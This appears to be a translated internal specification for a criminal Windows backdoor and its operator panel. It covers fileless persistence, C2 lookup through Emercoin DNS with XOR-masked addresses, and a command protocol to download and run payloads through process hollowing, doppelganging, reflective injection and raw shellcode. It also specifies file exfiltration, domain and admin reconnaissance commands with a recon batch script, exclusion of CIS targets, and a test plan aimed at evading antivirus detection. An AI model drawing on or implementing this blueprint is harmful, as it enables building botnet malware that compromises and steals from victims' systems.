column1: Sentence
MINIMALISTIC BACKDOOR
TECHNICAL SPECIFICATION
OBJECTIVE
To develop a backdoor (a kind of lightweight bot) that does not use the current codebase, minimally sufficient to be fixed on target computers,
if possible, not saving anything to the hard disk (fileless-technology).
In the following, "bot" and "backdoor" are synonyms.
REQUIREMENTS
Backdoor must have the following functionality:
*- get a foothold in the system (survive system reboot)
- communicate with the admin, report status and receive commands from the admin.
- MUST NOT bypass UAC
- MUST NOT escalate privileges
- get command server addresses from publicly available services (emercoin dns, google cache, bitcoin transaction amounts, etc. - the simpler the better).
- work via proxy, if it is specified in the operating system settings (inetcpl.cpl -> Connection ->
Proxy settings)
- collect and send information about the system to the server: **
- OS version and bitness
- antivirus type and version
- if possible list of installed software

(customer's note: it is not essential if we know the antivirus - but in general it is possible, it is not a burden, if we do it with the list of processes - then additionally it is possible to add search by PID in the admin)
- user name
- computer name
- whether the computer is in a domain or not (if yes, the name of the domain)
- list of trusted domains and domain information
(customer note: cmd /c net view /all
net view /all /domain
nltest /domain_trusts /all_trusts
+ add polling of domain user administrator, as implemented in trike)
- directory from where it is launched
- traffic to the command server should be masked if possible (ideally not TCP)
- be able to download and run .exe or .dll
- There must be protection against botnet hijacking by compromising the server or pads (i.e. having access to the command server is not enough to redirect control of the entire botnet),
to redirect control of the entire botnet to another command server).
- immediate failure when working in the .ru/CIS zone - cut on the backend; also check for a
Russian layout.
*- delete on command
*- items with an asterisk: it is assumed that the bot will be non-resident, i.e. it will NOT be fixed in the system.
Therefore, everything that concerns residency (fixing, updating, deleting) should NOT be done in this version.
However, plugs remain and the idea is that some (point) executions can be resident and support these functions.
** information collection can be transferred to an external script and not be part of the backdoor.
All additional functionality (including interactive shell) is REALIZED by external software loaded on command.
You can pick any load to run.
What is not available in the public and we have, can be adapted to run as .exe (sockets, etc.).
REALIZATION
General Requirements
The backdoor must adhere to the following rules:
- save nothing as files, if possible also its body (fileless)
- work with unprivileged user rights
- minimum OS version - Windows 7/Windows 2008 (without R2)
- the main working variant is a 32-bit build which should work with both 32- and 64-bit load (running files).
- The 64-bit build is also included in the package.
Fileless means that much of the functionality is implemented by powershell scripts, wscript, jscript and other built-in Windows interpreters.
If you need to save something to disk, you should use steganography - mimicry of valid file types
(pictures, .p12, .pfx, .crt, etc.), saving the .exe body in the registry, in file streams (ntfs file streams), and other non-obvious places.
and other non-obvious places.
The backdoor must be implemented in accordance with the "code and assembly design" requirements.
In addition, you should minimize the binary file size by disabling all kinds of Visual Studio security checks (maybe use another compiler?),
disabling the standard library as much as possible, etc.
You should prepare projects for building in different compilers (at least, besides Visual Studio, MinGW and possibly clang) in order to increase binary variability.
The bot can be designed both as an .exe and as a .dll (for easier launching from the loader,
since deploying a .dll from memory is easier than a fileless .exe).
In this case, the entry point to the .dll is the DllMain(DLL_PROCESS_ATTACH) function
1. identification
The backdoor must be uniquely identified by a unique identifier.
It is suggested to use md5 hash of the string "date_creation%windir%.computer_name.date_creation%windir\system32%.domain_name_or_workgroup",
and use NOT the hex representation, but the usual 10-bit representation of the hash as a long 128-bit number.
- The ID must be generated every time
- and it must be the same when run by different users of the system.
- it must not be saved to disk
- it must be unique
The second important identifier is group - a string of arbitrary length.
It is not interpreted by the bot itself.
It is sewn into the binary at the build stage; its only purpose from the bot's point of view is to be sent to the server.
If the bot does not have a hardwired group in the bot body, the bot _does not_ send the group value in requests (see below).
An identifier is needed to distinguish one bot from another.
The group is needed to know the bot's owner (the operator who has access to the bot's actions).
2. Protection against control hijacking
Possible scenarios for botnet control capture are as follows:
- seizing control of a compromised pad
- spoofing domain names on DNS servers
The defense consists of validating command and control servers by digital signature, and redundant connections.
The connection and validation algorithm is described in detail in the ToR Resident Loader.
PROTOCOL OF EXCHANGE WITH BACKEND
1. general requirements
All the exchange is done via HTTP(S) protocol.
It is possible to tunnel the protocol through other transports (DNS, ICMP) in order to pass firewalls and hide traffic,
but the base is HTTP.
All requests contain the backdoor identifier, operation type and parameters in the URI, e.g.
GET /%id%/%operation%/%params%
A response with HTTP code 200 is considered successful; all codes not equal to 200 indicate an error.
The group must be passed on any request to the server as a Cookie header with the group name and group value.
All commands to download a file from the network assume that the file is encrypted.
XOR is used as the encryption algorithm.
The key is the identifier of the backdoor in HEX representation.
It is assumed that the admin will prepare and provide a link to download the file's
encrypted file body for each bot.
It is assumed that the admin will cache frequently launched files to save on the number of
of file downloads to the admin.
All commands to send data to the server (POST) assume the same encryption of the POST request body content.
All commands to start a program for execution assume the following:
- %cmdline% is used to denote the command line passed to the running process.
The command line may contain spaces.
That is, in the command of the form "10 https://site.com/file.xyz -c -z -a" the command line is the substring "-c -z -a",
which corresponds to the %cmdline% convention in the following examples.
- The %id% macro can be used in the command line, instead of which the backdoor identifier in decimal representation is substituted.
For example, the command "10 1 0 https://site.com/file.xyz -c -z -a
-i %id%" received by a backdoor with ID 12345 from the server should be converted to the command line "-c -c -z -a
command line "-c -z -a -i 12345" before passing it to the running process.
- the VERS environment variable containing the bot ID must be set for any running process.
The list of command line macros can be extended in the future - provide.
Launching cmd/powershell scripts and commands is supposed to be done with the usual CreateProcess().
Launching of third-party .exe should be done using hidden techniques Process Hollowing/Process Doppelganging.
2. Connecting to the command server
Several parameters are flashed in the backdoor at the build stage:
- group identifier
- address of the main server for communication
- address of backup emercoin domains (several)
Algorithm of search and validation to the server is described in TOR Resident loader.
At any network failure in the already established connection to the server (such as no response by timeout), by default:
- make three retries
- make a repeated search for the server according to the algorithm in the Resident Loader ToR.
Assumption:
- if it is a temporary network outage, the backdoor will resume its attempts after the computer reboots
- if it is a permanent outage, it is better to behave quietly and not give away its presence in the system.
After resolving the IP address from the Emercoin domain, the IP address should be resolved by performing an XOR 254 operation for each octet.
For example, 124.245.101.251 (obtained from DNS response) -> 130.11.155.5
Since DNS information is available to everyone, this way we protect against abuses of DNS-recorded addresses.
The code of the ipxor.ps1 script in PowerShell:
$ip = read-host -prompt "Enter IP";
write-host $ip;
$newip = '';
($ip.split('.')
| foreach {
$octet = [byte] ( $_)
$octet = $octet -bxor 254;
$newip = -join($newip,'.',$octet);
write-host $newip;
4. Command request:
GET /%id%/2
Response: text of the form "code_command parameters"
The bot gives this request:
- by default every 5 minutes
- or by value from the last NOP response (see below)
Most commands block execution (launching files for execution with a non-zero timeout value),
i.e. it is supposed to wait for the result of the previous command before executing the next one.
If the previous command was blocking, the HTTP command request is still made, but all commands except 14 (state reset) are ignored.
Command codes and parameters:
NOP
%time% - no operation.
Time is the number of seconds for which the bot should go to sleep before the next bounce to the server.
1 %time% Get system information.
Time is the number of seconds the bot should sleep before the next debounce to the server.
The time parameter is optional.
* System information can also be obtained by running a .cmd script (command 12).
10 %runtype% %timeout% %
mask_process% %URI%
%cmdline% - download and run .exe file
[%mode% %
cmdline%]
- %runtype% - 1 for normal startup (CreateProcess; startup file of arbitrary bit rate)
2 for process hollowing (file of the same bit rate as the backdoor)
3 to run using the process doppelganging technique (file of the same bit size as the backdoor).
(Process Herpaderping technique can be used)
4 self-updating: replace the loader body with the downloaded file and restart.
If the body is empty, start the self-updating procedure by launching the bootloader (same as mode 0, remains for compatibility)
%mode% - startup mode:
0 - no file (start the loader that started this bot and terminate)
1 - exe-loader, start with the command: filename.exe %cmdline%
2 - dll-loader, run with the command: rundll32 filename.dll,%cmdline%
3 - dll-loader, run with command: regsvr32 /s
filename.dll %cmdline%
4 - js-loader (the way of launching will have to be specified)
cmdline - start command line parameters
for mode=2 the first parameter is the name of export-function - entry point to the loader.
5 file drop to disk without startup.
cmdline specifies the full path where to put the file.
- %timeout% - command execution timeout, in seconds.
0 - do not wait for the command to execute (assume that the command will be executed as a background process).
If the timeout is specified, the bot should wait for the command execution and give the code and status of its completion by a subsequent request.

At the same time, the bot cannot accept commands to start new processes before the current one is finished (the arrival of such a command from the admin area is considered an error and is ignored by the bot).
If the timeout is not specified, the launched process is considered to be a background process, the bot does not care about its fate, and it can launch new processes without restrictions.
If the process has not completed within the specified timeout, the bot aborts the process and signals an error to the server.
- %mask_process% - process name for masking process hollowing/process doppelganging
0 - do not use
1 - notepad.exe
2 - explorer.exe
3 - svchost.exe
4 - cmd.exe

URI% - the link from where the file should be downloaded (and decrypted); one attempt to download the file, in case of failure - in response to the command the message "could not download file from %uri%" is displayed
In protocol version 2 this parameter is absent (here and in other commands), the load is passed in the body of GET-response.
- %cmdline% - command line to run (optional)
11 %runtype%
%pid% %timeout%
%URI% %cmdline% - download and launch .dll
file
- %runtype% 0 - rundll
It is assumed to run with the rundll32.exe command as follows:
rundll32.exe
dllname.dll,%cmdline%
1 - regsvr Supposed to be run with the regsvr.exe command as follows:
regsvr.exe dllname.dll %cmdline%
The name of the dll entry point is always DllRegisterServer
2 - regsvr (silent) Same as 1, only it is run in "silent" mode, start command: regsvr32.exe /s dllname.dll %cmdline%
3 - reflective injection into %pid% process.
3 and 4 billet for
It is supposed to use the technique of reflective injection https://github.com/dismantl/ImprovedReflectiveDLLInjection.
The name of the bootstrap function (bootstrap function, in the original ReflectiveLoader) is passed by the first parameter %cmdline.
4 - reflective injection into own process
- %pid% 0 is not used (for runtype 0 1 3)
not 0 - process number for reflective injection
12 %runtype% %timeout%
[%cmdline%]\r\n%script% - run .bat-script with parameters
- %runtype% - 1 run the script through the channel (see the note to command 13 on launching technique)
2 dump the script to disk and run it via CreateProcess
- %cmdline% - the command line of the script itself (i.e. what is passed in the parameters %1, %2, etc. to the .bat script is NOT the command line of the cmd.exe process!
optional parameter
the script text is after the line separator \r\n.
When running the script with dump to disk, the name of the script file is autogenerated; after execution, the temporary script file is deleted.
13 %runtype% %timeout%
[%cmdline%]\r\n%script% - run powershell script with parameters
- %runtype% - 1 run the script through the channel
2 dump the script to disk and run it via CreateProcess
- %cmdline% - the command line of the script itself (i.e. what is passed to argv in .ps1-script is NOT the command line of the powershell.exe process!
The script text is after the \r\n line separator
In protocol version 2, the script text is passed in the body of the GET response.
It is supposed to run as follows:
runtype = 1
a channel is opened in the parent process, its descriptor is specified in STARTUPINFO when powershell.exe is launched, then the script is written to this channel.
Powershell is started like this:
powershell -
runtype = 2
powershell -executionpolicy bypass -file tmpscript.ps1 %cmdline%
When you run the script with a dump to disk, the name of the script file is autogenerated; after execution, the temporary script file is deleted
14 - reset.
Reset the handler of the previous command.
If the previous command has the state (waiting for the result of the process execution),
we reset this state and do not wait for anything else.
15 %pid% - stop process (TerminateProcess)
16 filename - upload a file from the computer to the server
17 %hexcode% - run arbitrary binary code in the context of your own process,
using the following technique https://github.com/DimopoulosElias/SimpleShellcodeInjector/blob/master/SimpleShellcodeInjector.c
Code format: AB CD EF 01 23 45 67 - 16-character space-separated string, upper case, WITHOUT line feeds, length limited to 1 megabyte.
No timeout is used.
Shell code is assumed to be non-blocking.
18 %timeout% to commit to the system.
It is assumed that the bot is not anchoring itself, but the bootloader.
100 Remove from the system.
The command is relevant only for the bot variant that uses locking in the system.
The result of the previous command
POST /%id%/3
The response body contains form/urlencoded text.
The interpretation depends on the previous command.
It is assumed that until the response to the command is received, subsequent commands from the admin are blocked
(otherwise it will be impossible to understand which command has been answered).
The bot sends the result in a loop until any response is received from the server (including an erroneous one - HTTP codes 40*, 50*).
If there was a transmission timeout within three attempts, the bot doubles the sending intervals until the interval reaches 30 minutes.
Until a response is sent, the bot does not pick up new tasks.
Response to file start commands
For file start commands, the response consists of two parts: the process identifier, and the program output (stdout AND stderr), separated by a newline character.
stdout and stderr here
If a startup error occurs, 0 (zero) is given as the identifier, and the next line is an error message.
5.1 Response to command 1 with system information
The body of the POST request is sent in a form/urlencoded package, with the following fields:
group=%groupname%
path=complete path to the backdoor binary file (unless fileless technology is used)
os=3-7 digits containing major-version, minor-version and build of the operating system, if the system has them
(for example, for 6.1 build 7600 this would be 617600).
os[1]=sign of OS type (W=Windows) and OS version
os[2]=OS build
os[3]=ProductInfo https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getproductinfo
For Windows 7 (Version 6.1 build 7600 ProductInfo 0x00) this would be os[1]=W61&os[2]=7600&os[3]=00
arch=architecture (bit): 86 or 64
cname=computer name
uname=user name
av[]=antivirus type
avp[]=version of antivirus
domain=computer domain or workgroup name (can be obtained from NetWkstaGetInfo)
net=result of the net view /all command
netdomain=result of the command net view /all /domain
net group "Domain Computers" /domain
trust=result of the command nltest /domain_trusts /all_trusts
admin=result of the command net localgroup "administrator"
admindomain=result of the command net group "domain admins" /dom
soft=list of installed programs
ip=external IP address of the computer
locale=local
tz=temporary zone
ps=process list
wsl=the presence of WSL/WSL2 subsystem on the computer
5.2 Response to command 100 uninstall from system
OK string in case of success, any arbitrary string with error description in case of error.
5.3 Response to 10-4 self-update command
An arbitrary status string reporting the result of the backdoor's actions or intentions.
For example, "OK", or "Will autoupdate in 60 seconds", or "Cannot proceed"
5.4 Response to command 15 to stop the process
The response returns the result of executing GetLastError() immediately after executing TerminateProcess() as a response
as a decimal number
5.5 Response to command 16 about uploading a file to the server
The response returns the contents of the file "as is", without x-www-urlencoded or multipart/form-data containers, so as not to inflate the size of transmission
due to redundant encoding.
The Content-Length header must be transmitted.
Content-Type header value: application/octet-stream
Files up to 10 megabytes in size are transmitted.
Attempts to request a larger file will result in an error message in the body, e.g. File too large.
The admin accepts and saves the file as part of the history; the file is available for download from the command history of a particular bot.
5.6 Response to command 17 on execution of arbitrary shell code
An arbitrary status string reporting the results.
For example:
HEX parse error
Done
Still alive, etc.
5.7 Response to command 18 to commit to the system
An arbitrary status string reporting the results.
For example:
Done
Error anchoring, error code = %ld
Still alive, etc.
Sending a message
POST /%id%/4
The POST body contains an arbitrary message encrypted with XOR %id%.
The backdoor sends the message on its own initiative (not in response to any action or request from the server).
You should use sending messages as little as possible - you don't want to flood.
This feature is supposed to be used as remote logging and tracing.
ADMIN, REQUIREMENTS
Bot list
- bots with IP-address, internal id, group, country, last activity, local domain are displayed.
(customer note: in its absence, indicating that it is a vorkgroup, arbitrary changeable comment)
- filters and sorting by all fields
including, in the second version, search on all system information (OS version, presence/absence of software, etc.)
- pagination or infinite scrolling (developer's choice)
On the bot page:
- possibility to set a note for the bot (arbitrary editable text field)
- last activity time
- system information in a separate section/tab
- bot commands (according to the list of commands from the corresponding section)
- bot history (each event with date - setting, all commands given by the operator with date-time with all results,
events from the bot (query 4))
It is assumed that after giving a command to the bot, subsequent commands are blocked until a response is received from the bot.
The blocking is removed after the bot goes offline (more time has passed than the double interval of the bot's command request).
IF THE BACKDOOR'S IP ADDRESS IS GEOLOCATED IN THE CIS ZONE, ALL COMMANDS EXCEPT "DELETE" SHOULD BE BANNED FROM THE OPERATOR.
It is supposed to have a directory of frequently executed files (startup cache), both for the convenience of the operator,
and to save traffic and time on repeated downloads of the same commands to the admin area.
Access Roles:
- admin (can create and delete operators and do everything)
- operator
Operator access level is regulated based on:
- group (in the first version)
- country (this and further - in the second version)
- IP address range
APPENDIX
1. Code for obtaining an external IP address
2. DNS-resolve code via Emercoin
3. Code for obtaining a list of installed programs
4. Code to start a program via process hollowing/doppelganging
5. Code for DNS tunnel for TCP connections
String obfuscation code
System call obfuscation code
TEST PLAN
Full functional testing is performed when:
- testing a new backdoor implementation
- significant changes in the version
- if significant defects in operation are noticed.
Smoke test for fixing is carried out weekly.
The AB test is performed daily and when preparing crypts.
The source code is tested for ABs
- after the developer has finished the cleanup.
- every morning, if the source was clean before (if there are detects, there is no point in doing it).
- if there are reasons to believe that there are detects.
Crypt is always tested for AV.
FULL FUNCTIONAL TESTING
We check the whole system in a complex - resident loader, backdoor, admin.
In the antivirus settings you should disable sending samples and cloud protection, at least at first, so that samples are not merged.
We get a set of loaders from the developer - logged and unlogged versions, x86 and x64.
First check the logical version, then the non-logical one.
We check it on virtual machines in the network.
We do this so that we can show the log for any error and call the developer on the machine.
If an error occurs while testing the non-logical version, we try to repeat it on the logical version.
If it repeats on the logical version, we fix the log and call the developer.
If it is NOT repeated on the logical version, fix that the bug is present only on the non-logical version.
The mandatory condition of the test success at any step is that there is no activity (popups, messages from AB, etc.)
on the screen of the target machine,
unless otherwise specified (for example, if it is not a special build that shows running programs on the contrary, etc.).
1. Run the loader on the target VM.
2. Go to the admin under the role of an operator, to whom the group of this bot is available.
Wait for a tap, within 5 minutes.
If there is no feedback, error, stop.
The bot should be displayed as "online" if it has been contacted for at least 15 minutes.
3. Execute commands one by one.
The first command may be delayed (up to 5 minutes) - this is normal.
3.1 Get System Info
Should get system info in the corresponding tab.
3.2 Run .exe with different combinations of Run Type, Host Process (Mask) fields.
Choose a file that does not require third-party .dll
(statically linked).
For example, pscp.exe.
The command should be executed and the output text of this command should be in the results of the command execution.
* if timeout = background run is selected, no response to the command is expected - the command is executed in the background and we are not interested in its fate.
The bot is immediately ready to receive new commands.
3.3 Run .dll
TODO
3.4 Run .bat
3.4.1 Enter a separate command, e.g. hostname, whoami, date /t.
The command should execute, the output of the command should contain the output text of the command.
3.4.2 Pour the prepared .bat file of several commands.
The tester must know the result of working of this file on his machine.
The script should be executed, the output of the command should contain the output text of this script.
3.5 Run PowerShell
3.5.1 Enter a separate command, such as $PSVersionTable.PSVersion
(outputs the Powershell version)
The cmdlet should run, and the output of the cmdlet should contain the output text of the cmdlet.
3.5.2 Pour the prepared .ps1 file from a few commands.
The tester should know the result of running this file on his machine.
The script should be executed, the command execution results should contain the output text of this script.
3.6 Reset
Before executing this command, you should run something long (you can try run .bat timeout 10000),
which will block the bot from executing commands.
After executing Reset, the previous blocking command should be marked as done, the bot is ready to receive the next command.
3.7 Terminate Process
This command kills a process by its pid number (pid)
To do this, you need to prepare the victim process (for example, run notepad.exe by hand and see its number in the Task Manager).
After the command is executed, the process should terminate.
3.8 Download File
This command downloads a file from the target machine (up to 10M in size).
The full path to the file must be entered in the corresponding field.
After the command is executed, the file should be available for downloading, the link should be present in the results of the command execution.
Suicide
This command removes the loader from the target machine.
After rebooting the machine, the bot should not be tapping.
4. Locking.
After rebooting the machine, the bot should tap in the admin area.
5. Detects.
There should be no detects on either the loader or the bot.
6. Updating
If you run an x86 loader on an x64 machine, it should first update to the x64 version of itself,
and then load only the x64 bot.
In simple words - the loader should launch the bot of the maximum available bitness.
6.2.1 Go to the admin section under the QA role (this is the person who is responsible for releases and updates)
Prepare a set with a new version of the bot and loader with the same group and the same upgrade paths.
Find out from the developer the line with the version of this kit.
Note: each file in the kit may have a different version.
Fill new versions of files into the panel and set the files to the version recognized at the previous step.
6.2.5 Reboot the target machine.
Updates should get to the machine.
CONSOLIDATION TEST
Only tapping into the admin area, rebooting the machine and tapping again after rebooting are tested.
IMPORTANT!
It is necessary to clarify the details of fixing from the developer.
Launching after reboot may be delayed or triggered by an indirect trigger.
TEST FOR ANTIVIRUS DETECTIONS
Autotests on VMs with the required AV are used:
- by the developer himself in the development and cleanup cycle
- by the tester for rough testing.
Dyncheck tests are used:
- before final release to the customer
- as needed
This should not be done frequently, so as not to expose the samples.
Additionally, before final delivery to the customer, tests should be performed by downloading from the link provided by the CUSTOMER,
with the file name PROVIDED by the CUSTOMER.
OLD TEST PLAN
Given for history only.
TESTING according to the plan described above!
1. test receiving and execution of commands.
The backdoor (DB) will request a command in the admin (ADM) once every 30 sec,
execute and send a response.
Commands are selected in the admin area.
Set timeouts in commands to 60 seconds.
3. Request command GET /%id%/2, response POST /%id%/3.
4. Commands.
"0 %time%" - in admin no_operation 30 sec.
no response
This command should be issued first to speed up testing, because 30 sec will be set for the database forever.
4.2 Command 10.
This command should pass a program to run, which is test32.exe.
The test32.exe program outputs the text "test" and the list of received parameters to stdout.
The database should pass this output to ADM.

a b c %id% - these are parameters to test32.exe, they should be output as they are, together with % signs.
%id% is a macro, which the database will replace with its id.

4.3 Command 11: This command should send to start the dll, which is TestDll32.dll.
The Start function from TestDll32.dll outputs the stdout text "test dll - start()".
The database should pass this output to ADM.
General format 11 %timeout%
URI%

4.4 Command 12.
Start cmd script.
"12 60 cmd /c cd c:\&&dir" - start the script without creating a bat-file
the answers are the same as in command 10.
"12 60 cmd /c\r\ncd c:\r\ndir" - start the script by creating a bat-file.
the answers are the same as in command 10.
4.5 Command 13.
Running a powershell script.
"13 60 a b c\r\ncd c:\r\ndir" - start the script by creating a ps1 file
a b c - parameters for the script, may be absent.
the answers are the same as in command 10.

SYSTEM INFORMATION RETRIEVAL SCRIPT
@echo off
echo General Info:
systeminfo
echo.
echo My Username:
whoami
echo.
echo Network Neighbourghoud:
net view /all
echo.
echo Domain Neighbourghoud:
net view /all /domain
echo.
echo Domain Trust:
nltest /domain_trusts /all_trusts
echo.
echo Installed Programs:
reg query hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /v
"DisplayName" /s
echo.
echo Installed Programs (wow64):
reg query hklm\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall /v
"DisplayName" /s
echo.
echo Installed Programs (current user):
reg query hkcu\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /v
"DisplayName" /s
echo.

reg query hkcu\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall /v
"DisplayName" /s

echo.
